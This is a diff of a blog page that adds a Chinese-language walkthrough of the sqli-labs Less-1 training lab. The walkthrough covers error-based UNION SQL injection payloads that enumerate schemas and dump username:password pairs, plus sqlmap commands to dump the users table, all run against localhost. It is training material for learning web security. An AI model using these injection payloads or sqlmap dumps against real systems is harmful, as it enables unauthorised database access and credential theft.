@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/27/ctf-web7/">ctf-web7</a>
+      <a class="article-title" href="/2020/09/27/ctf-web7/">sqli-labs专题持续更新</a>
     </h1>
   
 
@@ -86,7 +86,46 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/1.png" class></div>
+
+<h3 id="一、error-based"><a href="#一、error-based" class="headerlink" title="一、error_based"></a>一、error_based</h3><p>显错注入-联合查询:知识点</p>
+<p>1.判断注入点：以第一种为例id=1’ 在1后面加上单引号，页面出错；id=1 and 1=1 正常 id=1 and 1=2 错误</p>
+<p>2.判断字段数：通过order by的回显 //order by 1–+</p>
+<p>3.判断回显点：union select 1,2,3–+</p>
+<p>4.查询相关内容：***UNION 内部的 SELECT 语句必须拥有相同数量的列！！！</p>
+<p>​    a.查数据库：and 1=2 union select 1,schema_name from information_schema.schemata limit 0,1</p>
+<p>​    b.猜询表名：<br>and 1=2 union select 1,table_name from information_schema.tables where table_schema=’库名’ limit 1,1</p>
+<p>​    c.查询字段名：</p>
+<p>and 1=2 union select 1,column_name from information_schema.columns where table_schema=’库名’ and table_name=’表名’ limit 0,1</p>
+<p>​    d.查询字段内容<br>and 1=2 union select 1,name from ‘表名’</p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><h5 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h5><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> 报错找到注入点</p>
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+ 确定位数</p>
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,database()–+ 确定当前数据库名字</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/2.png" class></div>
+
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+ 确定所有数据库的名称</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/3.png" class></div>
+
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+ 确定当前数据库的所有表</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/4.png" class></div>
+
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’–+确定表名为users的全部列</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/4_1.png" class></div>
+
+<p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)–+ 确定两列的data，username：password</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/5.png" class></div>
+
+<h5 id="sqlmap演示"><a href="#sqlmap演示" class="headerlink" title="sqlmap演示"></a>sqlmap演示</h5><p>python2 sqlmap.py -u <a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a> –dbs</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/6.png" class></div>
+
+<p>python2 sqlmap.py -u <a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a> –tables -D “security”</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/7.png" class></div>
+
+<p>python2 sqlmap.py -u <a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a> –columns  -T “users” -D “security”</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/8.png" class></div>
+
+<p>python2 sqlmap.py -u <a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a> –dump -C “username,password” -T “users” -D “security”</p>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/9.png" class></div>
       
     </div>
     <footer class="article-footer">
@@ -208,8 +247,7 @@
 <div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/11.png" class></div>
 
 <p>得到flag</p>
-<p>六、 web</p>
-
+<h3 id="六、-web"><a href="#六、-web" class="headerlink" title="六、 web"></a>六、 web</h3>
       
     </div>
     <footer class="article-footer">
@@ -705,7 +743,7 @@
       <ul>
         
           <li>
-            <a href="/2020/09/27/ctf-web7/">ctf-web7</a>
+            <a href="/2020/09/27/ctf-web7/">sqli-labs专题持续更新</a>
           </li>
         
           <li>
